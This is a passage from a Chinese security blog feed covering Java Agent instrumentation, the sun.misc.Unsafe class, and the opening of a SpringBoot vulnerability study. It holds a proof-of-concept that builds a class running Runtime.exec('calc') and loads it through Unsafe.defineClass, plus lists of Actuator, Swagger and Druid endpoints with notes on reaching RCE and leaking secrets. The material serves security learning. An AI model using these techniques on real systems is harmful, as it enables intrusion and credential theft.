class="string">&quot;java/util/Date&quot;</span>.equals(className)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 从ClassPool获得CtClass对象</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;java.util.Date&quot;</span>);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">convertToAbbr</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;convertToAbbr&quot;</span>);</span><br><span class="line">                <span class="comment">//这里对 java.util.Date.convertToAbbr() 方法进行了改写，在 return之前增加了一个 打印操作</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">methodBody</span> <span class="operator">=</span> <span class="string">&quot;&#123;sb.append(Character.toUpperCase(name.charAt(0)));&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;sb.append(name.charAt(1)).append(name.charAt(2));&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;System.out.println(\&quot;sb.toString()\&quot;);&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;return sb;&#125;&quot;</span>;</span><br><span class="line">                convertToAbbr.setBody(methodBody);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 返回字节码，并且detachCtClass对象</span></span><br><span class="line">                <span class="type">byte</span>[] byteCode = clazz.toBytecode();</span><br><span class="line">                <span class="comment">//detach的意思是将内存中曾经被javassist加载过的Date对象移除，如果下次有需要在内存中找不到会重新走javassist加载</span></span><br><span class="line">                clazz.detach();</span><br><span class="line">                <span class="keyword">return</span> byteCode;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果返回null则字节码不会被修改</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="JVM启动后运行"><a href="#JVM启动后运行" class="headerlink" title="JVM启动后运行"></a>JVM启动后运行</h4><p>上面介绍的Instrumentation是在JDK1.5中提供的，开发者只能在main加载之前添加手脚，在Java SE 6的Instrumentation当中，提供了一个新的代理操作方法：agentmain，可以在main函数开始运行之后再运行。</p>
<p>跟premain函数一样，开发者可以编写一个含有agentmain函数的Java类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助Instrumentation#retransformClasses(Class&lt;?&gt;... classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure>

<p>同样，agentmain方法中带Instrumentation参数的方法也比不带优先级更高。开发者必须在manifest文件里面设置“Agent-Class”来指定包含agentmain函数的类。</p>
<p>在Java JDK6以后实现启动后加载<code>Instrument</code>的是<code>Attach api</code>。存在于<code>com.sun.tools.attach</code>里面有两个重要的类。</p>
<p>来查看一下该包中的内容，这里有两个比较重要的类，分别是<code>VirtualMachine</code>和<code>VirtualMachineDescriptor</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620000021184-715292334.png" alt="image-20220620000020624"></p>
<h5 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h5><p><code>VirtualMachine</code>可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。下面来看看这几个方法的作用</p>
<p><strong>Attach</strong> ：从 JVM 上面解除一个代理等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p>
<p><strong>loadAgent</strong>：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。</p>
<p><strong>Detach</strong>：从 JVM 上面解除一个代理(agent)</p>
<h5 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h5><p>则是一个描述虚拟机的容器类，配合<code>VirtualMachine</code>类完成各种功能。</p>
<h5 id="attach实现动态注入的原理"><a href="#attach实现动态注入的原理" class="headerlink" title="attach实现动态注入的原理"></a>attach实现动态注入的原理</h5><p>通过VirtualMachine类的attach(pid)方法，便可以attach到一个运行中的java进程上，之后便可以通过loadAgent(agentJarPath)来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620000747337-50578901.png" alt="image-20220620000746585"></p>
<p>既然是两个进程之间通信那肯定的建立起连接，VirtualMachine.attach动作类似TCP创建连接的三次握手，目的就是搭建attach通信的连接。而后面执行的操作，例如vm.loadAgent，其实就是向这个socket写入数据流，接收方target VM会针对不同的传入数据来做不同的处理。</p>
<h4 id="agentmain测试"><a href="#agentmain测试" class="headerlink" title="agentmain测试"></a>agentmain测试</h4><p>工程结构和 上面premain的测试一样，编写AgentMainTest，然后使用maven插件打包 生成MANIFEST.MF。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransFormer</span>(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DefineTransFormer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;post agent load class : &quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打包生成jar包，编写测试main方法。的步骤是：从一个attach JVM去探测目标JVM，如果目标JVM存在则向它发送agent.jar。我测试写的简单了些，找到当前JVM并加载agent.jar。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取当前系统中所有 运行中的 虚拟机</span></span><br><span class="line">        System.out.println(<span class="string">&quot;running JVM start &quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class="line">            <span class="comment">//如果虚拟机的名称为 xxx 则 该虚拟机为目标虚拟机，获取该虚拟机的 pid</span></span><br><span class="line">            <span class="comment">//然后加载 agent.jar 发送给该虚拟机</span></span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().endsWith(<span class="string">&quot;AgentTest&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;D:\\code\\java1\\AgentTest2\\out\\AgentTest-1.0-SNAPSHOT.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>list()方法会去寻找当前系统中所有运行着的JVM进程，通过vmd.displayName()看到当前系统都有哪些JVM进程在运行。因为main函数执行起来的时候进程名为当前类名，所以通过这种方式可以去找到当前的进程id。</p>
<p>执行结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620001805996-1965653405.png" alt="image-20220620001805482"></p>
<h3 id="Instrumentation的局限性"><a href="#Instrumentation的局限性" class="headerlink" title="Instrumentation的局限性"></a>Instrumentation的局限性</h3><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，或者笼统说就是类重定义(Class Redefine)的功能，但是有以下的局限性：</p>
<ol>
<li>premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</li>
<li>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses()方法，此方法有以下限制：</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://juejin.cn/post/7017781194481729549">https://juejin.cn/post/7017781194481729549</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14086165.html">https://www.cnblogs.com/nice0e3/p/14086165.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java Agent</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Unsafe类</title>
    <url>/2022/06/20/Java%E5%AE%89%E5%85%A8%E4%B9%8BUnsafe%E7%B1%BB/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Unsafe类是一个位于<code>sun.misc</code>包下的类，它提供了一些相对底层方法，能够让我们接触到一些更接近操作系统底层的资源，如系统的内存资源、cpu指令等。而通过这些方法，我们能够完成一些普通方法无法实现的功能，例如直接使用偏移地址操作对象、数组等等。但是在使用这些方法提供的便利的同时，也存在一些潜在的安全因素，例如对内存的错误操作可能会引起内存泄漏，严重时甚至可能引起<code>jvm</code>崩溃。因此在使用<code>Unsafe</code>前，我们必须要了解它的工作原理与各方法的应用场景，并且在此基础上仍需要非常谨慎的操作，下面我们正式开始对<code>Unsafe</code>的学习。</p>
<span id="more"></span>

<h3 id="Unsafe功能"><a href="#Unsafe功能" class="headerlink" title="Unsafe功能"></a>Unsafe功能</h3><p>Unsafe的功能大致如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620103647091-1158751055.png" alt="image-20220620103646466"></p>
<p>查看<code>Unsfe</code>源码，可以看到该类被<code>final</code>关键字修饰，代表不能被其他类继承</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620103913629-1940021883.png" alt="image-20220620103913441"></p>
<p>构造方法被<code>private</code>修饰，就表明不能通过<code>new</code>的方式创建<code>Unsafe</code>类的实例，下面的<code>getUnsafe()</code>方法可以返回Unsafe的实例。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620104204571-232105421.png" alt="image-20220620104204449"></p>
<p>查看下<code>isSystemDomainLoader()</code>方法，可以看到如果<code>var0</code>为<code>Bootstrap</code>类加载器，那么就会等于”null”，也就是返回true</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620104837713-1091388885.png" alt="image-20220620104837746"></p>
<p>编写测试方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620105153809-876885794.png" alt="image-20220620105153647"></p>
<h3 id="Unsafe调用"><a href="#Unsafe调用" class="headerlink" title="Unsafe调用"></a>Unsafe调用</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><p>该类的成员变量<code>theUnsafe</code>定义为它的实例化，因此可以利用反射获取该变量的值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620105932113-277751152.png" alt="image-20220620105932116"></p>
<p>编写测试代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">o</span> <span class="operator">=</span> (Unsafe)theUnsafe.get(<span class="literal">null</span>);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620110257766-771249312.png" alt="image-20220620110257727"></p>
<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><p>因为Unsafe类里面存在getUnsafe方法，该方法的返回值是Unsafe的实例对象，所以可以通过反射调用该方法。</p>
<p>编写测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">o</span> <span class="operator">=</span> (Unsafe)declaredConstructor.newInstance();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620112336594-616937168.png" alt="image-20220620112336568"></p>
<h3 id="Class相关操作"><a href="#Class相关操作" class="headerlink" title="Class相关操作"></a>Class相关操作</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//静态属性的偏移量，用于在对应的Class对象中读写静态属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">//获取一个静态字段的对象指针</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">//判断是否需要初始化一个类，通常在获取一个类的静态属性的时候（因为一个类如果没初始化，它的静态属性也不会初始化）使用。 当且仅当ensureClassInitialized方法不生效时返回false</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">//确保类被初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br><span class="line"><span class="comment">//定义一个类，可用于动态创建类，此方法会跳过JVM的所有安全检查，默认情况下，ClassLoader（类加载器）和ProtectionDomain（保护域）实例来源于调用者</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                   ClassLoader loader,</span><br><span class="line">                                   ProtectionDomain protectionDomain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个匿名类，可用于动态创建类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; hostClass, <span class="type">byte</span>[] data, Object[] cpPatches);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>学习下<code>Unsafe.defineClass()</code>的运用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.security.CodeSource;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.Certificate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, CannotCompileException, IOException, NotFoundException, NotFoundException, CannotCompileException, IOException, InvocationTargetException &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">Classname</span> <span class="operator">=</span><span class="string">&quot;org.agent.Commandtest&quot;</span>;</span><br><span class="line">        ClassPool classPool= ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;org.agent.Commandtest&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes=payload.toBytecode();</span><br><span class="line">        <span class="comment">//获取系统加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="comment">//创建默认保护域</span></span><br><span class="line">        <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>), <span class="literal">null</span>, systemClassLoader, <span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe)declaredConstructor.newInstance();</span><br><span class="line">        Class&lt;?&gt; aClass1 = unsafe.defineClass(Classname, bytes, <span class="number">0</span>, bytes.length, systemClassLoader, protectionDomain);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass1.newInstance();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在JDK 11版本以后就移除了该方法。但还可以利用<code>defineAnonymousClass</code>方法。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/14102892.html">https://www.cnblogs.com/nice0e3/p/14102892.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Unsafe</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot相关漏洞学习</title>
    <url>/2022/06/26/SpringBoot%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="SpringBoot-相关漏洞的学习"><a href="#SpringBoot-相关漏洞的学习" class="headerlink" title="SpringBoot 相关漏洞的学习"></a>SpringBoot 相关漏洞的学习</h3><span id="more"></span>

<h3 id="路由知识"><a href="#路由知识" class="headerlink" title="路由知识"></a>路由知识</h3><ul>
<li><code>spring</code>的根路径有时候设定为<code>/manage</code>、<code>/management</code>、项目app路径</li>
<li>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 <code>/</code> ，2.x 版本则统一以 <code>/actuator</code> 为起始路径</li>
<li>Spring Boot Actuator 默认的内置路由名字有时会被修改</li>
</ul>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><blockquote>
<p>开发人员么有意识到地址泄露会产生安全隐患，或者说项目从测试环境切换为开发环境时，开发人员忘记修改配置文件等。</p>
</blockquote>
<h4 id="路由地址及接口调用详情泄漏"><a href="#路由地址及接口调用详情泄漏" class="headerlink" title="路由地址及接口调用详情泄漏"></a>路由地址及接口调用详情泄漏</h4><h5 id="Swagger相关"><a href="#Swagger相关" class="headerlink" title="Swagger相关"></a>Swagger相关</h5><p>swagger相关的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br></pre></td></tr></table></figure>

<p>还会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure>

<h5 id="Actuator相关"><a href="#Actuator相关" class="headerlink" title="Actuator相关"></a>Actuator相关</h5><p> spring boot actuator 相关的路由如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mappings</span><br><span class="line">/metrics</span><br><span class="line">/beans</span><br><span class="line">/configprops</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/configprops</span><br></pre></td></tr></table></figure>

<h5 id="druid相关"><a href="#druid相关" class="headerlink" title="druid相关"></a>druid相关</h5><p>druid的相关路径如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">html:</span><br><span class="line">/druid/index.html             #Druid Index</span><br><span class="line">/druid/sql.html               #Druid sql监控页面</span><br><span class="line">/druid/weburi.html            #Druid Web URI监控页面</span><br><span class="line">/druid/websession.html        #Druid Web Session监控页面</span><br><span class="line"></span><br><span class="line">json:</span><br><span class="line">/druid/weburi.json            #Druid Web URI json</span><br><span class="line">/druid/websession.json        #Druid Web Session json</span><br><span class="line"></span><br><span class="line">Druid 登录接口：</span><br><span class="line">/druid/login.html            #Druid登录认证页面</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">/system/druid/login.html</span><br><span class="line">/webpage/system/druid/login.html</span><br><span class="line">/druid/datasource.html</span><br><span class="line">/druid/wall.html</span><br><span class="line">/druid/webapp.html</span><br><span class="line">/system/druid/websession.html</span><br><span class="line">/webpage/system/druid/websession.html</span><br><span class="line">/druid/spring.html</span><br><span class="line">/druid/api.html</span><br></pre></td></tr></table></figure>

<p>暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但攻击者可以通过审计暴露出的接口以增加对业务系统的了解，并会检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p>
<h4 id="配置不当而暴露的路由"><a href="#配置不当而暴露的路由" class="headerlink" title="配置不当而暴露的路由"></a>配置不当而暴露的路由</h4><p>可能因为配置不当而暴露的默认内置路由可能会有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/actuator</span><br><span class="line">/auditevents</span><br><span class="line">/autoconfig</span><br><span class="line">/beans</span><br><span class="line">/caches</span><br><span class="line">/conditions</span><br><span class="line">/configprops</span><br><span class="line">/docs</span><br><span class="line">/dump</span><br><span class="line">/env</span><br><span class="line">/flyway</span><br><span class="line">/health</span><br><span class="line">/heapdump</span><br><span class="line">/httptrace</span><br><span class="line">/info</span><br><span class="line">/intergrationgraph</span><br><span class="line">/jolokia</span><br><span class="line">/logfile</span><br><span class="line">/loggers</span><br><span class="line">/liquibase</span><br><span class="line">/metrics</span><br><span class="line">/mappings</span><br><span class="line">/prometheus</span><br><span class="line">/refresh</span><br><span class="line">/scheduledtasks</span><br><span class="line">/sessions</span><br><span class="line">/shutdown</span><br><span class="line">/trace</span><br><span class="line">/threaddump</span><br><span class="line">/gateway</span><br><span class="line">/actuator/auditevents</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/health</span><br><span class="line">/actuator/conditions</span><br><span class="line">/actuator/configprops</span><br><span class="line">/actuator/env</span><br><span class="line">/actuator/info</span><br><span class="line">/actuator/loggers</span><br><span class="line">/actuator/heapdump</span><br><span class="line">/actuator/threaddump</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/scheduledtasks</span><br><span class="line">/actuator/httptrace</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/jolokia</span><br><span class="line">/actuator/hystrix.stream</span><br><span class="line">/actuator/gateway</span><br><span class="line">/actuator/gateway/routes</span><br></pre></td></tr></table></figure>

<p>对于暴露的路由，有几个值得我们去关注：</p>
<ul>
<li><code>/env</code>、<code>/actuator/env</code></li>
</ul>
<p>​    GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等    信息；当程序员的属性名命名不规范，例如 password 写成     psasword、pwd 时，会泄露密码明文；</p>
<p>​    同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
<ul>
<li><code>/refresh</code>、<code>/actuator/refresh</code></li>
</ul>
<p>​    POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p>
<ul>
<li><code>/restart</code>、<code>/actuator/restart</code></li>
</ul>
<p>​    暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p>
<ul>
<li><code>/jolokia</code>、<code>/actuator/jolokia</code></li>
</ul>
<p>​    可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
